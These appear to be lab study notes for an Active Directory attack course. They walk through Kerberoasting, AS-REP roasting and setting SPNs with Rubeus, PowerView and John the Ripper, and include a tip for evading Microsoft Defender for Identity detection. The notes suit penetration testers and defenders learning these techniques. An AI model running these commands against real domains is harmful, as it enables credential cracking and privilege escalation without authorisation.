**Let think of scenario's where there where no service or paths, how can we escalate privileges in an active directory environment, what are other opportunities/ways we can go about it ??**

# **Kerberoast**


![](https://i.imgur.com/ruStWfi.png)



- Offline cracking of service account passwords.
- The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
- Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!


**_Example -:_**


- Find user accounts used as Service accounts


```powershell
# AD Module

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView

Get-DomainUser -SPN
```

> **Hint :** When you run `klist`, the SPN can be identified as the name of the {service/machine name}


![](https://i.imgur.com/S7sx0zM.png)


**_Capturing Hashes :_**


- Use Rubeus to list Kerberoast stats


```powershell
Rubeus.exe kerberoast /stats
```


- Use Rubeus to request a TGS (This is a must run)


```powershell
Rubeus.exe kerberoast /user:svcadmin /simple 
```


- To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC (Also must run)

```powershell
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

- Kerberoast all possible accounts

```powershell
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```


> **Note -:** You don't need invisi-shell while running `rubeus` here, it won't be stable, also the options with **must run**, must be ran as one might provide an hash and the other might not, depending on system configuration



**_Cracking Hashes :_**


- Crack ticket using John the Ripper


```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-
worst-pass.txt C:\AD\Tools\hashes.txt
```


# **Learning Objective 14**

- Using the Kerberoast attack, crack password of a SQL server service account.


## **Solution**


**_Coming Soon_**



# **Targeted Kerberoasting - AS-REPs**


- If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.



![](https://i.imgur.com/MITSHLg.png)


**_Example -:_**


- Enumerating accounts with Kerberos Preauth disabled

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired -Verbose

# AD module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```


- Force disable Kerberos Preauth
- Let's enumerate the permissions for RDPUsers on ACLs using `PowerView`:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```



- Request encrypted AS-REP for offline brute-force.
- Let's use `ASREPRoast`


```powershell
Get-ASREPHash -UserName VPN1user -Verbose
```


- To enumerate all users with Kerberos preauth disabled and request a hash


```powershell
Invoke-ASREPRoast -Verbose
```


- We can use John The Ripper to brute-force the hashes offline

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
pass.txt C:\AD\Tools\asrephashes.txt
```



# **Targeted Kerberoasting - Set SPN**

- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

**_Example :_**

- Let's enumerate the permissions for **RDPUsers** on ACLs using `PowerView`:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

- See if the user already has a SPN:


```powershell
# Powerview
Get-DomainUser -Identity supportuser | select serviceprincipalname

# AD module
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```


- Set a SPN for the user (must be unique for the forest)

```powershell
# Powerview
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}

# AD module
Set-ADUser -Identity support1user -ServicePrincipalNames
@{Add=‘dcorp/whatever1'}
```



